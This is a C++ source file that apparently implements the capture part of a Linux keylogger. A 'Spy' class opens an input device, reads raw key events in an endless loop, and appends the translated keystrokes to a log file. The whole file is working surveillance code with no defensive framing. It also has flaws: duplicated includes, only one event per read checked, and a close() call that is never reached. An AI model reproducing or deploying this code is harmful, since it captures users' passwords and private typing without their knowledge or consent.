
#include "Spy.hpp"
#include <cstdlib>
#include <fcntl.h>
#include <fstream>
#include <cstdlib>
#include <iostream>
#include <dirent.h>
#include <filesystem>
#include <sys/types.h>
#include <sys/ioctl.h>
#include "../constants.hpp"
#include <linux/input.h>
#include <sys/stat.h>
#include <unistd.h>
#include <fcntl.h>
#include <fstream>

kl::Spy::Spy(std::string input, std::string output)
    : _inputPath(input), _outputPath(output) {}

void kl::Spy::start()
{
    int fd{0};
    size_t lineLength {0};
    std::ofstream output{_outputPath, std::ios::app};
    struct input_event *evt = new struct input_event[64];

    if ((fd = open(_inputPath.c_str(), O_RDONLY)) < 0)
        perror("open");
    output << "SPY Launched " << _outputPath << " " << _inputPath << std::endl;
    while (1)
        if (read(fd, evt, sizeof(*evt) * 64) > 0)
        {
            if (!(evt[1].value)) continue;
            lineLength += kl::keymap[evt[1].code].size();
            output << kl::keymap[evt[1].code] << (lineLength > 150 ? "\n" : "");
            lineLength = lineLength > 150 ? 0 : lineLength;
        }
    if (fd > -1)
        close(fd);
}
